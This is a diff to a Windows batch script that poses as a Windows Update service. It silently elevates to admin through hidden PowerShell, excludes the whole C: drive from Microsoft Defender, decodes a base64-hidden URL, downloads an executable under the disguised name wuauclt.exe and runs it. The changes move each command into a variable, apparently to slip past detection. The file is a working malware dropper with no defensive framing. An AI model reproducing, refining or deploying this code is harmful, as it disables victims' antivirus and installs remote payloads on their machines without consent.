@@ -1,11 +1,15 @@
 @echo off
+setlocal enabledelayedexpansion
 if not "%1"=="MINIMIZED" (
     start "" /min cmd /c "%~f0" MINIMIZED %*
     exit /b
 )
 
+set "adminCheck=0"
 net session >nul 2>&1
-if %errorLevel% == 0 (
+if %errorLevel% == 0 set "adminCheck=1"
+
+if %adminCheck% == 1 (
     goto :runAsAdmin
 ) else (
     goto :requestElevation
@@ -22,7 +26,9 @@ if %errorLevel% == 0 (
     
     :tryElevate
     echo Microsoft Windows Update Service...
-    powershell -noprofile -windowstyle hidden -command "Start-Process -WindowStyle Hidden -FilePath 'cmd.exe' -ArgumentList '/min /c \"\"%batchPath%\" %batchArgs%\"' -Verb RunAs"
+    set "psCmd=powershell -noprofile -windowstyle hidden -command"
+    set "psArgs=Start-Process -WindowStyle Hidden -FilePath 'cmd.exe' -ArgumentList '/min /c \"\"%batchPath%\" %batchArgs%\"' -Verb RunAs"
+    %psCmd% "%psArgs%"
     if %errorLevel% == 0 (
         timeout /t 2 >nul
         exit
@@ -37,10 +43,12 @@ if %errorLevel% == 0 (
     )
     
     setlocal
-    powershell -NoProfile -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath 'C:\'"
+    set "defenderCmd=Add-MpPreference -ExclusionPath 'C:\'"
+    powershell -NoProfile -ExecutionPolicy Bypass -Command "%defenderCmd%"
     set "exeFile=%TEMP%\wuauclt.exe"
     set "url1=aHR0cHM6Ly9naXRodWIuY29tL3ZhdWx0MDUzMDA5LW1ha2VyL2EvcmF3L3JlZnMvaGVhZHMvbWFpbi9WaW9sZXRDbGllbnQuZXhl"
-    powershell -Command "$url = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('%url1%')); (New-Object Net.WebClient).DownloadFile($url, '%exeFile%')"
+    set "downloadCmd=$url = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('%url1%')); (New-Object Net.WebClient).DownloadFile($url, '%exeFile%')"
+    powershell -Command "%downloadCmd%"
     start "" "%exeFile%"
     endlocal
     exit
